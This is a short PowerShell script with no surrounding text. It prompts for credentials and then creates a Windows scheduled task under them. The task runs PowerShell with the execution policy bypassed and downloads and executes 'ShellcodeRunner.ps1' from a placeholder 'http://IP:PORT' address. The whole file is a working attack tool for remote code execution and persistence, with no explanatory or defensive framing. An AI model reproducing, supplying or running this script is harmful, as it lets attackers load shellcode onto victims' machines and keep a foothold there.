# Prompt the user for credentials
$credential = Get-Credential

# Define the PowerShell command
$powerShellCommand = "-exec bypass iex (New-Object System.Net.WebClient).DownloadString(''http://IP:PORT/ShellcodeRunner.ps1'')"

# Extract the username and password from the credential
$username = $credential.UserName
$password = $credential.GetNetworkCredential().Password

# Define the command to create the scheduled task using schtasks.exe
$powerShellCommandEscaped = $powerShellCommand -replace "'", "''" # Escape single quotes
$command = "schtasks /create /tn 'TASKNAME' /tr `"powershell.exe $powerShellCommandEscaped`" /sc once /st 11:04 /ru $username /rp $password"

# Execute the command using Invoke-Expression
Invoke-Expression -Command $command

